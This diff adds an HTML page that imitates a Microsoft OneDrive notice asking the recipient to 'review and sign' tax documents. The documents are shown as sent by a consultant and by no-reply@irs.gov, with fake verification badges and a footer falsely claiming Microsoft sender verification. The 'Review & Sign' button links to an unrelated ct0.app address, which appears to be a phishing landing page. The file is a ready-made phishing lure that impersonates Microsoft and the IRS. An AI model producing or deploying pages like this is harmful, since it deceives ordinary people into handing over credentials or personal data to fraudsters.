@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OneDrive Document Review</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --onedrive-blue: #ffff;
+      --onedrive-light: #2e8af7;
+      --bg-light: #f4f9ff;
+      --white: #ffffff;
+      --text-dark: #222;
+      --text-light: #666;
+      --radius: 12px;
+      --shadow: 0 6px 20px rgba(0,0,0,0.08);
+    }
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: var(--bg-light);
+      color: var(--text-dark);
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .container { max-width: 700px; width: 100%; padding: 20px; }
+
+    .header {
+      background: var(--onedrive-blue);
+      padding: 16px 24px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      color: white;
+      border-radius: var(--radius) var(--radius) 0 0;
+    }
+    .logo { height: 52px; }
+    .sender { font-size: 15px; display: flex; align-items: center; gap: 4px; }
+    .verified-small { height: 11px; width: 11px; vertical-align: super; }
+
+    .card {
+      background: var(--white);
+      border-radius: 0 0 var(--radius) var(--radius);
+      box-shadow: var(--shadow);
+      padding: 30px;
+    }
+
+    .message { font-size: 16px; margin-bottom: 20px; }
+
+    .doc-list { display: flex; flex-direction: column; gap: 12px; margin-bottom: 25px; }
+    .doc-item {
+      display: flex;
+      align-items: center;
+      background: #f9fbff;
+      padding: 14px 16px;
+      border-radius: 8px;
+      border: 1px solid #e6ecf5;
+    }
+    .doc-icon { font-size: 18px; color: var(--onedrive-light); margin-right: 12px; }
+    .doc-info { flex: 1; }
+    .doc-name { font-weight: 500; font-size: 15px; }
+    .doc-meta { font-size: 13px; color: var(--text-light); display: flex; align-items: center; gap: 4px; }
+
+    .btn-primary {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 14px 28px;
+      background: var(--onedrive-light);
+      color: white;
+      font-weight: 600;
+      border-radius: 8px;
+      text-decoration: none;
+      font-size: 16px;
+      transition: background 0.2s;
+    }
+    .btn-primary:hover { background: var(--onedrive-blue); }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: var(--text-light);
+      text-align: center;
+      line-height: 1.5;
+    }
+    .footer img { height: 20px; vertical-align: middle; margin-bottom: 8px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <img class="logo" src="https://1000logos.net/wp-content/uploads/2020/08/OneDrive-Logo-2014.png" >
+    </div>
+
+    <div class="card">
+      <p class="message">You’ve received important documents to review and sign.</p>
+
+      <div class="doc-list">
+        <div class="doc-item">
+          <div class="doc-icon"><i class="fas fa-file-pdf"></i></div>
+          <div class="doc-info">
+            <div class="doc-name">Tax Verification Document.pdf</div>
+            <div class="doc-meta">From: dan@legalconsult.com <img class="verified-small" src="https://upload.wikimedia.org/wikipedia/commons/e/e0/Eo_circle_light-blue_checkmark.svg"> • Today</div>
+          </div>
+        </div>
+        <div class="doc-item">
+          <div class="doc-icon"><i class="fas fa-file-contract"></i></div>
+          <div class="doc-info">
+            <div class="doc-name">IRS Form 1040 Agreement.docx</div>
+            <div class="doc-meta">From: no-reply@irs.gov <img class="verified-small" src="https://upload.wikimedia.org/wikipedia/commons/e/e0/Eo_circle_light-blue_checkmark.svg"> • Yesterday</div>
+          </div>
+        </div>
+      </div>
+
+      <a href="https://b52bdfe9-0f2a-4bae-b9c1-d5ce33f95039.ct0.app/r/jOcXIs5rFhVUhhj7TCUu1dLRJ8jGU_sq8jO14U8iQZn2hgFkya7l-V8DpOJEijtRPXiqy_owu2r2nLP3Qaa3TNDqLl612mr3CO86lhUMB4qtMO65YblA9jxPnYO_4QjLJAlvfSI8kpcmGetlx90BnWd9UKqLNEMFHqpnVU9ekqn8Drv-NoIVDD5ABzsLyGyyGlEAwsSj8yVyDkDk8QOCmxWbHJSnV8Feys8taGN-YIA6_A4zS9OFHmLqofIxSsAJDsPY6feD62oD-d-COaNXvqTQ_GADWJAjN0UZD3ns_cpLSbPLpbuUVu1cPJ7yQCs_2gsDftQInAOoNT91TPYdAR-qzTIIqNgm__aJ0DaDjfKqhFvmI_tjhAVKet8aPzCpGaampL-LsYqzIc7IFvnHG-jsfHRinz6oPIclUdhRfsGhXwsXEcjJMgn7Ki_09_VUFOuz24etG1GUBkDN92KjWc0w-KzML_JKx9wD_0AiFNKIKOgMt53UEEBJodZ8pz-J9swtCiCa2g5q20YvLIO_o1Zq6OiFXieWVSx6djGVKncAy0d5vhHetqh9Q9h8DWoBbXAGsjl79tnbN_gxt4rguQ" class="btn-primary"><i class="fas fa-pen-to-square"></i> Review & Sign</a>
+    </div>
+
+    <div class="footer">
+      <img src="https://1000logos.net/wp-content/uploads/2017/04/Microsoft-Logo.png" alt="Microsoft Logo"><br>
+      <p>© 2025 Microsoft OneDrive. All rights reserved.<br>
+      This message and any attachments are intended only for the recipient. If you received this in error, please delete it immediately. Unauthorized distribution, reproduction, or other use of this communication is prohibited and may be unlawful. Microsoft makes no warranties regarding this message and disclaims liability for damages of any kind arising from the misuse of this information.The authenticity of the sender has been verified through Microsoft Safelink Networks. before taking any action. Use of Microsoft OneDrive services is subject to the Terms of Use and Privacy Policy available on the official Microsoft website.</p>
+    </div>
+  </div>
+</body>
+</html>
